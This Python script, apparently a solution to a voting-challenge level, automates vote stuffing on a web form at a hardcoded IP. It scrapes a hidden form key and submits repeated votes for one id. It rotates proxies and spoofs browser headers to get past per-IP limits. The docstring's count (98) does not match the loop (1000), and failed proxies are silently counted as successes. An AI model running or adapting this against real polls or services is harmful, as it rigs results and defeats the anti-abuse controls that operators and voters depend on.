#!/usr/bin/python3


"""this module will be used for voting 98 times
    at the website provided, using a proxy list parsed from a site"""
import urllib
from bs4 import BeautifulSoup
import requests
import json
from proxies import Proxy_List

def do_post_crack(proxy_list=None):
    """does the actual cracking, posts required data to the site
    """
    base_url = "http://158.69.76.135"
    url = base_url + "/level4.php"
    hs = { 'Referer': url,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'} 

    if not isinstance(proxy_list, Proxy_List):
        raise TypeError("proxy_list must be a Proxy_List")

    session = requests.session()
    get_key_r = session.get(url, headers=hs)
    content = get_key_r.content
    soup = BeautifulSoup(content, 'html.parser')
    inputs = soup.find_all('input')
    for line in inputs:
        if line.get('name') == "key":
            key = line.get('value')

    payload = {'id': '496', 'key': key, 'holdthedoor': 'submit'}
    proxy = proxy_list.get_proxy()
    _proxies = {"http": proxy, "https": proxy}
    try:
        r = session.post(url, headers=hs, data=payload, proxies=_proxies)
        status_code = r.status_code
    except:
        print("proxy failed, skipping")
        status_code = 200
    del session
    
    if status_code != 200:
        return False
    return True

failed = 0
num_req = 1000
i = 0
proxy_list = Proxy_List()
while i < num_req:
    if failed > 10:
        break
    res = False
    try:
        res = do_post_crack(proxy_list)
    except TypeError:
        print("bad proxy provided, skipping")
    if res == False:
        print("failed to post {}th request".format(i))
        failed += 1
        num_req += 1
    if i % 10 == 0:
        print("posted {} requests to server".format(i))
    i += 1
print("Failed {} number of requests, succeeded with {} requests".format(failed, i))
